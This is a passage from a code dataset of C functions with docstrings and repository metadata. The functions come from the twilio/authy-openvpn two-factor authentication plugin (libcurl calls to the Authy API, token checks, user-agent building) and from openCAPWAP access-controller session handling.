curl_easy_setopt(pCurl, CURLOPT_URL, pszResultUrl);\n\n  if(pszPostFields) // POST REQUEST\n  {\n    curl_easy_setopt(pCurl, CURLOPT_POSTFIELDS, pszPostFields);\n  }\n\n#ifdef WIN32\n  curl_easy_setopt(p_curl, CURLOPT_CAINFO, \"curl-bundle-ca.crt\");\n#endif\n\n  curl_easy_setopt(pCurl, CURLOPT_SSL_VERIFYPEER, 1L); //verify PEER certificate\n  curl_easy_setopt(pCurl, CURLOPT_SSL_VERIFYHOST, 2L); //verify HOST certificate\n  curl_easy_setopt(pCurl, CURLOPT_VERBOSE, 1L);\n  curl_easy_setopt(pCurl, CURLOPT_WRITEFUNCTION, curlWriter);\n  curl_easy_setopt(pCurl, CURLOPT_WRITEDATA, pszResponse);\n  curl_easy_setopt(pCurl, CURLOPT_USERAGENT, pszUserAgent);\n\n  curlResult = (int) curl_easy_perform(pCurl);\n  if(0 != curlResult) {\n    trace(ERROR, __LINE__, \"Curl failed with code %d\", curlResult);\n    r = FAIL;\n    goto EXIT;\n  }\n\n  trace(INFO, __LINE__, \"[Authy] Curl response: Body=%s\\n\", pszResponse);\n\n  r = OK;\n\nEXIT:\n  if(pszUserAgent)\n  {\n    free(pszUserAgent);\n  }\n\n#ifdef WIN32\n  trace(DEBUG, __LINE__, \"[Authy] Can't clean curl, curl easy cleanup doesn't work on Windows\");\n#else\n  if(pCurl){\n    curl_easy_cleanup(pCurl);\n  }\n#endif\n\n  return r;\n}", "path": "src\\authy_api.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "// Description\n//\n// This is the function that is called when one of the registered functions of the vpn\n// are called\n//\n// Parameters\n//\n//   pszRespone           - Response body in json format\n//\n// Returns\n//\n// Standard 0 is success, or something else otherwise.\n//\n", "func_signal": "OPENVPN_EXPORT int\nopenvpn_plugin_func_v1(openvpn_plugin_handle_t handle, const int type, const char *argv[], const char *envp[])", "code": "{\n  struct plugin_context *context = (struct plugin_context *) handle;\n\n  if(type == OPENVPN_PLUGIN_AUTH_USER_PASS_VERIFY){\n    return authenticate(context, argv, envp);\n  }\n\n  return OPENVPN_PLUGIN_FUNC_ERROR; //Auth FAILED\n}", "path": "src\\authy_openvpn.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "// Description\n//\n// Remove spaces from a NULL terminated String\n//\n// Parameters\n//\n//   pszString - A NULL terminated string containing spaces\n//\n// Returns\n//\n// a pointer to the beginning of the same string.\n//\n", "func_signal": "char *\nremoveSpaces(char *pszString)", "code": "{\n  assert(pszString != NULL);\n\n  char* i = pszString;\n  char* j = pszString;\n\n  while(*j != '\\0')\n  {\n    if(*i != ' ' && *i != '\\n' && *i != '\\r' && *i != '\\t'){\n      *i = *j;\n      i++;\n    }\n    j++;\n  }\n  *i = '\\0';\n\n  return pszString;\n}", "path": "src\\utils.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "// Description\n//\n//  Goes through the response body looking for token validity.\n//\n// Parameters\n//\n//   pszRespone           - Response body in json format\n//\n// Returns\n//\n//   TRUE if the response body includes \"token\": \"is valid\", FALSE otherwise.\n//\n", "func_signal": "BOOL\ntokenResponseIsValid(char *pszResponse)", "code": "{\n  int cnt;\n  jsmn_parser parser;\n  jsmn_init(&parser);\n  jsmntok_t tokens[20] = {{0}};\n  jsmn_parse(&parser, pszResponse, tokens, 20);\n\n  /* success isn't always on the same place, look until 19 because it\n     shouldn't be the last one because it won't be a key */\n  for (cnt = 0; cnt < 19; cnt++)\n  {\n    /* avoid matching empty strings since \"\" == \"\" */\n    int len = (tokens[cnt]).end - (tokens[cnt]).start;\n    if(len > 0 && strncmp(pszResponse + (tokens[cnt]).start, \"token\", len) == 0)\n    {\n      if(strncmp(pszResponse + (tokens[cnt+1]).start, \"is valid\", (tokens[cnt+1]).end - (tokens[cnt+1]).start) == 0){\n        return TRUE;\n      } else {\n        return FALSE;\n      }\n    }\n  }\n\treturn FALSE;\n}", "path": "src\\authy_api.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "// Description\n//\n// This is real core of the plugin\n// it handles the authentication agains Authy services\n// using the password field to obtain the OTP\n// and as other authentication plugins it sets its authenication status\n// to the control file\n//\n// Parameters\n//\n//   context           - Passed on by OpenVPN\n//   argv              - Passed by OpenVPN\n//   envp              - Passed by OpenVPN\n// Returns\n//\n// OPENVPN_PLUGIN_FUNC_SUCCESS: If authentication was succesful\n// OPENVPN_PLUGIN_FUNC_ERROR: If Auth was unsuccesful\n//\n", "func_signal": "static int\nauthenticate(struct plugin_context *context,\n             const char *argv[],\n             const char *envp[])", "code": "{\n  int iAuthResult = OPENVPN_PLUGIN_FUNC_ERROR; //auth failed\n\n  RESULT r = FAIL;\n  char *pszToken = NULL;\n  char *pszAuthyResponse = NULL;\n  char *pszCommonName = NULL;\n  char *pszUsername = NULL;\n  char *pszAuthyId = NULL;\n  char *pszWantedCommonName = NULL;\n  char *pszTokenStartPosition = NULL;\n\n\n  trace(INFO, __LINE__, \"[Authy] Authy Two-Factor Authentication started.\\n\");\n\n  pszUsername    = getEnv(\"username\", envp);\n  if(!pszUsername){\n    trace(ERROR, __LINE__,\"[Authy] ERROR: Username is NULL. Marking Auth as failure.\\n\");\n    iAuthResult = OPENVPN_PLUGIN_FUNC_ERROR;\n    goto EXIT;\n   }\n\n  r = getAuthyIdAndCommonName(&pszAuthyId, &pszWantedCommonName,AUTHY_VPN_CONF, pszUsername);\n  if(FAILED(r)){\n\t\ttrace(ERROR,\n          __LINE__,\n          \"[Authy] Authentication failed. Authy ID was not found for %s and Two-Factor Authentication is required.\\n\",\n          pszUsername);\n    iAuthResult = OPENVPN_PLUGIN_FUNC_ERROR;\n    goto EXIT;\n  }\n\n  // If AuthyId is null but function still returned success means that username was not found\n  // but the config allows username to logon without to factor auth.\n  if(SUCCESS(r) && !pszAuthyId){\n\n    // Login without two factor is only available when using pam. Else, it doesn't make sense to have two factor authentication,\n    // as anyone could login by finding an unexisting username.\n    if(FALSE == context->bPAM) {\n      trace(INFO,\n            __LINE__,\n            \"[Authy] Authentication failed. Username not found in authy-vpn.conf and since pam is not enabled, two factor is enforced for all users.\\n\");\n      iAuthResult = OPENVPN_PLUGIN_FUNC_ERROR;\n      goto EXIT;\n    }\n\t\ttrace(INFO,\n          __LINE__,\n          \"[Authy] Warning: Authentication succeeded because username %s was not found in config file and Two-Factor is not mandatory.\\n\",\n          pszUsername);\n    iAuthResult = OPENVPN_PLUGIN_FUNC_SUCCESS;\n    goto EXIT;\n  }\n\n  pszCommonName =  getEnv(\"common_name\", envp);\n  if(pszWantedCommonName && FAILED(validateCommonName(pszCommonName, pszWantedCommonName)) ){\n\t\ttrace(INFO,\n          __LINE__,\n          \"[Authy] Authentication failed. CommonaName validation failed.\\n\");\n    iAuthResult = OPENVPN_PLUGIN_FUNC_ERROR;\n    goto EXIT;\n  }\n\n  // From here we start authenticating the user token.\n  pszToken  = getEnv(\"password\", envp);\n  if(!pszToken){\n    trace(ERROR, __LINE__, \"[Authy] ERROR: Token is NULL. Marking Auth as failure.\\n\");\n    iAuthResult = OPENVPN_PLUGIN_FUNC_ERROR;\n    goto EXIT;\n  }\n\n  pszAuthyResponse= calloc(CURL_MAX_WRITE_SIZE + 1, sizeof(char)); //allocate memory for Authy Response\n  if(!pszAuthyResponse){\n    trace(ERROR, __LINE__, \"[Authy] ERROR: Unable to allocate memory for curl response. Marking Auth as failure.\\n\");\n    iAuthResult = OPENVPN_PLUGIN_FUNC_ERROR;\n    goto EXIT;\n  }\n\n  // Here check if the user is trying to just request a phone call or an sms token.\n  if (0 == strcmp(pszToken, \"sms\")){\n\n    sms(context->pszApiUrl, pszAuthyId, context->pszApiKey, pszAuthyResponse);\n    iAuthResult = OPENVPN_PLUGIN_FUNC_ERROR; //doing sms always fails authentication\n    goto EXIT;\n  }\n  else if(0 == strcmp(pszToken, \"call\")){\n     call(context->pszApiUrl, pszAuthyId, context->pszApiKey, pszAuthyResponse);\n     iAuthResult = OPENVPN_PLUGIN_FUNC_ERROR; //doing phone call always fails authentication\n     goto EXIT;\n  }\n\n  //PAM Authentication: password is concatenated and separated by TOKEN_PASSWORD_SEPARATOR\n  if(TRUE == context->bPAM)\n  {\n    pszTokenStartPosition = strrchr(pszToken, TOKEN_PASSWORD_SEPARATOR);\n    if (NULL == pszTokenStartPosition){\n      trace(ERROR, __LINE__, \"[Authy] PAM being used but password was not properly concatenated. Use [PASSWORD]-[TOKEN].\\n\");\n      iAuthResult = OPENVPN_PLUGIN_FUNC_ERROR;\n      goto EXIT;\n    }\n\t\t*pszTokenStartPosition = '\\0'; // This 0 terminates the password so that pam gets only the password and not the token.\n    pszToken = pszTokenStartPosition + 1;\n  }\n\n  if(FALSE == isTokenSafe(pszToken))\n  {\n    trace(ERROR, __LINE__, \"[Authy] Token is not safe. Aborting.\\n\");\n    iAuthResult = OPENVPN_PLUGIN_FUNC_ERROR;\n    goto EXIT;\n  }\n\n  trace(INFO, __LINE__, \"[Authy] Authenticating username=%s, token=%s with AUTHY_ID=%s.\\n\", pszUsername, pszToken, pszAuthyId);\n\n  r = verifyToken(context->pszApiUrl,\n                  pszToken,\n                  pszAuthyId,\n                  context->pszApiKey,\n                  pszAuthyResponse);\n\n  if (SUCCESS(r) && SUCCESS(responseWasSuccessful(pszAuthyResponse))){\n    iAuthResult = OPENVPN_PLUGIN_FUNC_SUCCESS; //Two-Factor Auth was succesful\n    goto EXIT;\n  }\n\n  iAuthResult = OPENVPN_PLUGIN_FUNC_ERROR;\n\nEXIT:\n\n\tif(pszAuthyId) {cleanAndFree(pszAuthyId);}\n  if(pszToken) { memset(pszToken, 0, (strlen(pszToken))); } // Cleanup the token. Password is left untouch.\n  if(pszAuthyResponse) { cleanAndFree(pszAuthyResponse);};\n\n  if(iAuthResult == OPENVPN_PLUGIN_FUNC_SUCCESS){\n    trace(INFO, __LINE__, \"[Authy] Auth finished. Result: Authy success for username %s.\\n\", pszUsername);\n  }\n  else{\n    trace(INFO, __LINE__, \"[Authy] Auth finished. Result: Authy failed for username %s.\\n\", pszUsername);\n  }\n\n  return iAuthResult;\n}", "path": "src\\authy_openvpn.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "/*\n * Free the memory related with the context\n * This is call before openvpn stops the plugin\n */\n", "func_signal": "OPENVPN_EXPORT void\nopenvpn_plugin_close_v1(openvpn_plugin_handle_t handle)", "code": "{\n  struct plugin_context *context = (struct plugin_context *) handle;\n  cleanAndFree(context->pszApiUrl);\n  cleanAndFree(context->pszApiKey);\n  free(context);\n}", "path": "src\\authy_openvpn.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "// Description\n//\n// Generates a user agent string for the plugin.\n//\n// Returns\n//\n//   A string with the user agent.\n", "func_signal": "char *\ngetUserAgent()", "code": "{\n  size_t userAgentSize = 0;\n  size_t systemInfoLength = 0;\n  char *pszUserAgent = NULL;\n  char *pszSystemInfo = NULL;\n\n#ifdef WIN32\n  systemInfoLength = strlen(\"Windows\");\n  pszSystemInfo = calloc(systemInfoLength + 1, sizeof(char));\n  if(NULL == pszSystemInfo)\n  {\n    trace(ERROR, __LINE__, \"[Authy] Could not allocate space for System Info\\n\");\n    goto EXIT;\n  }\n  snprintf(pszSystemInfo, systemInfoLength, \"Windows\");\n#else\n  struct utsname unameData;\n  if(-1 == uname(&unameData))\n  {\n    trace(INFO, __LINE__, \"[Authy] Could not fetch system info\\n\");\n    pszSystemInfo = calloc(strlen(\"Unknown\") + 1, sizeof(char));\n    if(NULL == pszSystemInfo)\n    {\n      trace(ERROR, __LINE__, \"[Authy] Could not allocate space for System Info\\n\");\n      goto EXIT;\n    }\n    snprintf(pszSystemInfo, strlen(\"Unknown\"), \"Unknown\");\n  }\n  else\n  {\n    systemInfoLength = strlen(unameData.sysname) + strlen(\" \") + strlen(unameData.release);\n    pszSystemInfo = calloc(systemInfoLength + 1, sizeof(char));\n    if(NULL == pszSystemInfo)\n    {\n      trace(ERROR, __LINE__, \"[Authy] Could not allocate space for System Info\\n\");\n      goto EXIT;\n    }\n    snprintf(pszSystemInfo, systemInfoLength, \"%s %s\", unameData.sysname, unameData.release);\n  }\n#endif\n\n  userAgentSize = strlen(\"AuthyOpenVPN/ ()\") + strlen(AUTHY_OPENVPN_VERSION) + strlen(pszSystemInfo);\n  pszUserAgent = calloc(userAgentSize + 1, sizeof(char));\n  if(NULL == pszUserAgent)\n  {\n    trace(ERROR, __LINE__, \"[Authy] Could not allocate space for User Agent\\n\");\n    goto EXIT;\n  }\n\n  snprintf(pszUserAgent, userAgentSize, \"AuthyOpenVPN/%s (%s)\", AUTHY_OPENVPN_VERSION, pszSystemInfo );\n\nEXIT:\n  if(pszSystemInfo)\n  {\n    free(pszSystemInfo);\n  }\n\n  return pszUserAgent;\n}", "path": "src\\utils.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "// Description\n//\n// Registers the functions that we want to intercept (OPENVPN_PLUGIN_AUTH_USER_PASS_VERIFY)\n// and initializes the plugin context that holds the api url, api key and if we are using PAM\n//\n// Parameters\n//\n//   type_mask            - Name of the enviromental\n//   argv                 - arguments\n//   envp                 - The environment\n//\n// Returns\n//\n// The handle to the plugin\n//\n", "func_signal": "OPENVPN_EXPORT openvpn_plugin_handle_t\nopenvpn_plugin_open_v1(unsigned int *type_mask,\n                       const char *argv[],\n                       const char *envp[])", "code": "{\n  /* Context Allocation */\n  struct plugin_context *context;\n\n  context = (struct plugin_context *) calloc(1, sizeof(struct plugin_context));\n\n  if(NULL == context){\n\t\ttrace(ERROR, __LINE__, \"[Authy] Failed to allocate context\\n\");\n    return (openvpn_plugin_handle_t)FAIL;\n  }\n\n  /* Save the verbosite level from env */\n  const char *verbosity = getEnv(\"verb\", envp);\n  if (verbosity){\n    context->verbosity = (int)strtol(verbosity, (char **)NULL, 10);\n  }\n\n  if(argv[1] && argv[2])\n  {\n    trace(DEBUG, __LINE__, \"Plugin path = %s\\n\", argv[0]);\n    trace(DEBUG, __LINE__, \"Api URL = %s, api key %s\\n\", argv[1], argv[2]);\n    context->pszApiUrl = (char *) calloc(strlen(argv[1]) + 1, sizeof(char));\n    strncpy(context->pszApiUrl, argv[1], strlen(argv[1]));\n\n    context->pszApiKey = (char *) calloc(strlen(argv[2]) + 1, sizeof(char));\n    strncpy(context->pszApiKey, argv[2], strlen(argv[2]));\n\n    context->bPAM  = 0;\n\n  }\n\n  if (argv[3] && strncmp(argv[3], \"pam\", 3) == 0){\n    context->bPAM = 1;\n  }\n\n  /* Set type_mask, a.k.a callbacks that we want to intercept */\n  *type_mask = OPENVPN_PLUGIN_MASK(OPENVPN_PLUGIN_AUTH_USER_PASS_VERIFY);\n\n  /* Cast and return the context */\n  return (openvpn_plugin_handle_t) context;\n\n}", "path": "src\\authy_openvpn.c", "repo_name": "twilio/authy-openvpn", "stars": 151, "license": "None", "language": "c", "size": 15089}
{"docstring": "/*____________________________________________________________________________*/\n/*  *****************************___ASSEMBLE___*****************************  */\n/*Update 2009:\n    Assemble protocol Configuration update request.\n    Mainly added to  manage vendor specific packets*/\n", "func_signal": "CWBool CWProtocolAssembleConfigurationUpdateRequest(CWProtocolMessage ** msgElems, int *msgElemCountPtr,\n\t\t\t\t\t\t    int MsgElementType)", "code": "{\n\tint *iPtr;\n\tint k = -1;\n\n\tif (msgElems == NULL || msgElemCountPtr == NULL)\n\t\treturn CWErrorRaise(CW_ERROR_WRONG_ARG, NULL);\n\n\tif ((iPtr = ((int *)CWThreadGetSpecific(&gIndexSpecific))) == NULL) {\n\t\treturn CW_FALSE;\n\t}\n\n\t*msgElemCountPtr = 1;\n\n\tCWLog(\"Assembling Protocol Configuration Update Request...\");\n\n\tCW_CREATE_PROTOCOL_MSG_ARRAY_ERR(*msgElems, *msgElemCountPtr, return CWErrorRaise(CW_ERROR_OUT_OF_MEMORY, NULL);\n\t    );\n\n\t/* Selection of type of Conf Update Request */\n\n\tswitch (MsgElementType) {\n\tcase CW_MSG_ELEMENT_VENDOR_SPEC_PAYLOAD_UCI:\n\n\t\t// Assemble Message Elements\n\t\tif (!(CWAssembleWTPVendorPayloadUCI(&(*msgElems[++k])))) {\n\t\t\tint i;\n\t\t\tfor (i = 0; i <= k; i++) {\n\t\t\t\tCW_FREE_PROTOCOL_MESSAGE(*msgElems[i]);\n\t\t\t}\n\t\t\tCW_FREE_OBJECT(*msgElems);\n\t\t\treturn CW_FALSE;\t// error will be handled by the caller\n\t\t}\n\t\tbreak;\n\tcase CW_MSG_ELEMENT_VENDOR_SPEC_PAYLOAD_WUM:\n\n\t\t// Assemble Message Elements\n\t\tif (!(CWAssembleWTPVendorPayloadWUM(&(*msgElems[++k])))) {\n\t\t\tint i;\n\t\t\tfor (i = 0; i <= k; i++) {\n\t\t\t\tCW_FREE_PROTOCOL_MESSAGE(*msgElems[i]);\n\t\t\t}\n\t\t\tCW_FREE_OBJECT(*msgElems);\n\t\t\treturn CW_FALSE;\t// error will be handled by the caller\n\t\t}\n\t\tbreak;\n\tdefault:{\n\t\t\treturn CW_FALSE;\t// error will be handled by the caller\n\t\t}\n\t}\n\n\tCWLog(\"Protocol Configuration Update Request Assembled\");\n\n\treturn CW_TRUE;\n}", "path": "ACProtocol.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*\n * Session's thread function: each thread will manage a single session\n * with one WTP.\n */\n", "func_signal": "CW_THREAD_RETURN_TYPE CWManageWTP(void *arg)", "code": "{\n\n\tint i = ((CWACThreadArg *) arg)->index;\n\tCWSocket sock = ((CWACThreadArg *) arg)->sock;\n\tint interfaceIndex = ((CWACThreadArg *) arg)->interfaceIndex;\n\n\tCW_FREE_OBJECT(arg);\n\n\tif (!(CWThreadSetSpecific(&gIndexSpecific, &i))) {\n\n\t\tCWLog(\"Critical Error with Thread Data\");\n\t\t_CWCloseThread(i);\n\t}\n\n\tif (!CWErr(CWThreadMutexLock(&gActiveWTPsMutex)))\n\t\texit(1);\n\n\tgActiveWTPs++;\n\n\tgInterfaces[interfaceIndex].WTPCount++;\n\tCWUseSockNtop(((struct sockaddr *)&(gInterfaces[interfaceIndex].addr)),\n\t\t      CWDebugLog(\"One more WTP on %s (%d)\", str, interfaceIndex););\n\n\tCWThreadMutexUnlock(&gActiveWTPsMutex);\n\n\tCWACInitBinding(i);\n\n\tgWTPs[i].interfaceIndex = interfaceIndex;\n\tgWTPs[i].socket = sock;\n\n\tgWTPs[i].fragmentsList = NULL;\n\t/* we're in the join state for this session */\n\tgWTPs[i].currentState = CW_ENTER_JOIN;\n\tgWTPs[i].subState = CW_DTLS_HANDSHAKE_IN_PROGRESS;\n\n\t/**** ACInterface ****/\n\tgWTPs[i].interfaceCommandProgress = CW_FALSE;\n\tgWTPs[i].interfaceCommand = NO_CMD;\n\tCWDestroyThreadMutex(&gWTPs[i].interfaceMutex);\n\tCWCreateThreadMutex(&gWTPs[i].interfaceMutex);\n\tCWDestroyThreadMutex(&gWTPs[i].interfaceSingleton);\n\tCWCreateThreadMutex(&gWTPs[i].interfaceSingleton);\n\tCWDestroyThreadCondition(&gWTPs[i].interfaceWait);\n\tCWCreateThreadCondition(&gWTPs[i].interfaceWait);\n\tCWDestroyThreadCondition(&gWTPs[i].interfaceComplete);\n\tCWCreateThreadCondition(&gWTPs[i].interfaceComplete);\n\tgWTPs[i].qosValues = NULL;\n\t/**** ACInterface ****/\n\n\tgWTPs[i].messages = NULL;\n\tgWTPs[i].messagesCount = 0;\n\tgWTPs[i].isRetransmitting = CW_FALSE;\n\tgWTPs[i].retransmissionCount = 0;\n\n\tCWResetWTPProtocolManager(&(gWTPs[i].WTPProtocolManager));\n\n\tCWLog(\"New Session\");\n\n\t/* start WaitJoin timer */\n\tif (!CWErr(CWTimerRequest(gCWWaitJoin,\n\t\t\t\t  &(gWTPs[i].thread), &(gWTPs[i].currentTimer), CW_CRITICAL_TIMER_EXPIRED_SIGNAL))) {\n\n\t\tCWCloseThread();\n\t}\n#ifndef CW_NO_DTLS\n\tCWDebugLog(\"Init DTLS Session\");\n\n\tif (!CWErr(CWSecurityInitSessionServer(&gWTPs[i],\n\t\t\t\t\t       sock, gACSecurityContext, &((gWTPs[i]).session), &(gWTPs[i].pathMTU)))) {\n\n\t\tCWTimerCancel(&(gWTPs[i].currentTimer));\n\t\tCWCloseThread();\n\t}\n#endif\n\t(gWTPs[i]).subState = CW_WAITING_REQUEST;\n\n\tif (gCWForceMTU > 0)\n\t\tgWTPs[i].pathMTU = gCWForceMTU;\n\n\tCWDebugLog(\"Path MTU for this Session: %d\", gWTPs[i].pathMTU);\n\n\tCW_REPEAT_FOREVER {\n\t\tint readBytes;\n\t\tCWProtocolMessage msg;\n\t\tCWBool dataFlag = CW_FALSE;\n\n\t\tmsg.msg = NULL;\n\t\tmsg.offset = 0;\n\n\t\t/* Wait WTP action */\n\n\t\tCWThreadMutexLock(&gWTPs[i].interfaceMutex);\n\n\t\twhile ((gWTPs[i].isRequestClose == CW_FALSE) &&\n\t\t       (CWGetCountElementFromSafeList(gWTPs[i].packetReceiveList) == 0) &&\n\t\t       (gWTPs[i].interfaceCommand == NO_CMD)) {\n\n\t\t\t/*TODO: Check system */\n\t\t\tCWWaitThreadCondition(&gWTPs[i].interfaceWait, &gWTPs[i].interfaceMutex);\n\t\t}\n\n\t\tCWThreadMutexUnlock(&gWTPs[i].interfaceMutex);\n\n\t\tif (gWTPs[i].isRequestClose) {\n\n\t\t\tCWLog(\"Request close thread\");\n\t\t\t_CWCloseThread(i);\n\t\t}\n\n\t\tCWThreadSetSignals(SIG_BLOCK, 2, CW_SOFT_TIMER_EXPIRED_SIGNAL, CW_CRITICAL_TIMER_EXPIRED_SIGNAL);\n\n\t\tif (CWGetCountElementFromSafeList(gWTPs[i].packetReceiveList) > 0) {\n\n\t\t\tCWBool bCrypt = CW_FALSE;\n\t\t\tchar *pBuffer;\n\n\t\t\tCWThreadMutexLock(&gWTPs[i].interfaceMutex);\n\t\t\tpBuffer = (char *)CWGetHeadElementFromSafeList(gWTPs[i].packetReceiveList, NULL);\n\n\t\t\tif (((pBuffer[0] & 0x0f) == CW_PACKET_CRYPT) && ((gWTPs[i].buf[0] & 0x0f) == CW_PACKET_CRYPT))\n\t\t\t\tbCrypt = CW_TRUE;\n\n\t\t\tCWThreadMutexUnlock(&gWTPs[i].interfaceMutex);\n\n\t\t\tif (bCrypt) {\n#ifndef CW_NO_DTLS\n\t\t\t\tif (!CWErr(CWSecurityReceive(gWTPs[i].session,\n\t\t\t\t\t\t\t     gWTPs[i].buf, CW_BUFFER_SIZE - 1, &readBytes))) {\n\t\t\t\t\t/* error */\n\n\t\t\t\t\tCWDebugLog(\"Error during security receive\");\n\t\t\t\t\tCWThreadSetSignals(SIG_UNBLOCK, 1, CW_SOFT_TIMER_EXPIRED_SIGNAL);\n\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n#else\n\t\t\t\tCWDebugLog(\"CAPWAP DTLS in not supported\");\n\t\t\t\tCWThreadSetSignals(SIG_UNBLOCK, 1, CW_SOFT_TIMER_EXPIRED_SIGNAL);\n\n\t\t\t\tcontinue;\n#endif\n\t\t\t} else {\n\t\t\t\tCWThreadMutexLock(&gWTPs[i].interfaceMutex);\n\t\t\t\tpBuffer =\n\t\t\t\t    (char *)CWRemoveHeadElementFromSafeListwithDataFlag(gWTPs[i].packetReceiveList,\n\t\t\t\t\t\t\t\t\t\t\t&readBytes, &dataFlag);\n\t\t\t\tCWThreadMutexUnlock(&gWTPs[i].interfaceMutex);\n\n\t\t\t\tmemcpy(gWTPs[i].buf, pBuffer, readBytes);\n\t\t\t\tCW_FREE_OBJECT(pBuffer);\n\t\t\t}\n\n\t\t\tif (!CWProtocolParseFragment(gWTPs[i].buf,\n\t\t\t\t\t\t     readBytes,\n\t\t\t\t\t\t     &(gWTPs[i].fragmentsList), &msg, &dataFlag, gWTPs[i].RadioMAC)) {\n\n\t\t\t\tif (CWErrorGetLastErrorCode() == CW_ERROR_NEED_RESOURCE) {\n\n\t\t\t\t\tCWDebugLog(\"Need At Least One More Fragment\");\n\t\t\t\t} else {\n\t\t\t\t\tCWErrorHandleLast();\n\t\t\t\t}\n\t\t\t\tCWThreadSetSignals(SIG_UNBLOCK, 1, CW_SOFT_TIMER_EXPIRED_SIGNAL);\n\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tswitch (gWTPs[i].currentState) {\n\t\t\tcase CW_ENTER_JOIN:{\n\t\t\t\t\t/* we're inside the join state */\n\t\t\t\t\tif (!ACEnterJoin(i, &msg)) {\n\t\t\t\t\t\tif (CWErrorGetLastErrorCode() == CW_ERROR_INVALID_FORMAT) {\n\t\t\t\t\t\t\t/* Log and ignore other messages */\n\t\t\t\t\t\t\tCWErrorHandleLast();\n\t\t\t\t\t\t\tCWLog(\"Received something different from a Join Request\");\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t/* critical error, close session */\n\t\t\t\t\t\t\tCWErrorHandleLast();\n\t\t\t\t\t\t\tCWThreadSetSignals(SIG_UNBLOCK, 1,\n\t\t\t\t\t\t\t\t\t   CW_SOFT_TIMER_EXPIRED_SIGNAL);\n\t\t\t\t\t\t\tCWCloseThread();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\tcase CW_ENTER_CONFIGURE:{\n\t\t\t\t\tif (!ACEnterConfigure(i, &msg)) {\n\t\t\t\t\t\tif (CWErrorGetLastErrorCode() == CW_ERROR_INVALID_FORMAT) {\n\t\t\t\t\t\t\t/* Log and ignore other messages */\n\t\t\t\t\t\t\tCWErrorHandleLast();\n\t\t\t\t\t\t\tCWLog(\"Received something different from a Configure Request\");\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t/* critical error, close session */\n\t\t\t\t\t\t\tCWErrorHandleLast();\n\t\t\t\t\t\t\tCWThreadSetSignals(SIG_UNBLOCK, 1,\n\t\t\t\t\t\t\t\t\t   CW_SOFT_TIMER_EXPIRED_SIGNAL);\n\t\t\t\t\t\t\tCWCloseThread();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\tcase CW_ENTER_DATA_CHECK:{\n\t\t\t\t\tif (!ACEnterDataCheck(i, &msg)) {\n\t\t\t\t\t\tif (CWErrorGetLastErrorCode() == CW_ERROR_INVALID_FORMAT) {\n\t\t\t\t\t\t\t/* Log and ignore other messages */\n\t\t\t\t\t\t\tCWErrorHandleLast();\n\t\t\t\t\t\t\tCWLog\n\t\t\t\t\t\t\t    (\"Received something different from a Change State Event Request\");\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t/* critical error, close session */\n\t\t\t\t\t\t\tCWErrorHandleLast();\n\t\t\t\t\t\t\tCWThreadSetSignals(SIG_UNBLOCK, 1,\n\t\t\t\t\t\t\t\t\t   CW_SOFT_TIMER_EXPIRED_SIGNAL);\n\t\t\t\t\t\t\tCWCloseThread();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\tcase CW_ENTER_RUN:{\n\t\t\t\t\tif (!ACEnterRun(i, &msg, dataFlag)) {\n\t\t\t\t\t\tif (CWErrorGetLastErrorCode() == CW_ERROR_INVALID_FORMAT) {\n\t\t\t\t\t\t\t/* Log and ignore other messages */\n\t\t\t\t\t\t\tCWErrorHandleLast();\n\t\t\t\t\t\t\tCWLog\n\t\t\t\t\t\t\t    (\"--> Received something different from a valid Run Message\");\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t/* critical error, close session */\n\t\t\t\t\t\t\tCWLog(\"--> Critical Error... closing thread\");\n\t\t\t\t\t\t\tCWErrorHandleLast();\n\t\t\t\t\t\t\tCWThreadSetSignals(SIG_UNBLOCK, 1,\n\t\t\t\t\t\t\t\t\t   CW_SOFT_TIMER_EXPIRED_SIGNAL);\n\t\t\t\t\t\t\tCWCloseThread();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\tdefault:{\n\t\t\t\t\tCWLog(\"Not Handled Packet\");\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tCW_FREE_PROTOCOL_MESSAGE(msg);\n\t\t} else {\n\n\t\t\tCWThreadMutexLock(&gWTPs[i].interfaceMutex);\n\n\t\t\tif (gWTPs[i].interfaceCommand != NO_CMD) {\n\n\t\t\t\tCWBool bResult = CW_FALSE;\n\n\t\t\t\tswitch (gWTPs[i].interfaceCommand) {\n\t\t\t\tcase QOS_CMD:{\n\t\t\t\t\t\tint seqNum = CWGetSeqNum();\n\n\t\t\t\t\t\t/* CWDebugLog(\"~~~~~~seq num in Check: %d~~~~~~\", seqNum); */\n\t\t\t\t\t\tif (CWAssembleConfigurationUpdateRequest(&(gWTPs[i].messages),\n\t\t\t\t\t\t\t\t\t\t\t &(gWTPs[i].messagesCount),\n\t\t\t\t\t\t\t\t\t\t\t gWTPs[i].pathMTU,\n\t\t\t\t\t\t\t\t\t\t\t seqNum,\n\t\t\t\t\t\t\t\t\t\t\t CONFIG_UPDATE_REQ_QOS_ELEMENT_TYPE))\n\t\t\t\t\t\t{\n\n\t\t\t\t\t\t\tif 